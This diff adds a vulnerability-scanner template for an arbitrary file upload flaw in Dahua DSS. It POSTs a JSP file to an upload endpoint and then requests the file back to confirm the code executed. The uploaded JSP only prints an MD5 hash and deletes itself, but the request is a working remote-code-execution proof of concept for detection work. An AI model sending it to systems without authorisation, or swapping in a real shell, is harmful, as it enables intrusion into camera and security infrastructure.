@@ -1,0 +1,65 @@
+id: dahua-file-upload
+
+info:
+  name: Dahua DSS File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There is a file upload vulnerability in the Dahua DSS /publishing/publishing/material/file/video endpoint that could allow attackers to execute arbitrary code by uploading malicious JSP files.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2023-03860
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/publishing/publishing/material/file/video"
+    headers:
+      Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
+    body: |
+      --dd8f988919484abab3816881c55272a7
+      Content-Disposition: form-data; name="Filedata"; filename="troZD.jsp"
+
+      <%@ page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      --dd8f988919484abab3816881c55272a7
+      Content-Disposition: form-data; name="poc"
+
+      poc
+      --dd8f988919484abab3816881c55272a7
+      Content-Disposition: form-data; name="Submit"
+
+      submit
+      --dd8f988919484abab3816881c55272a7--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - "VIDEO/"
+    extractors:
+      - type: regex
+        name: path1
+        internal: true
+        part: body
+        regex:
+          - "\"path\"\\s*:\\s*\"([^\"]+)\""
+        group: 1
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/publishingImg/{{path1}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
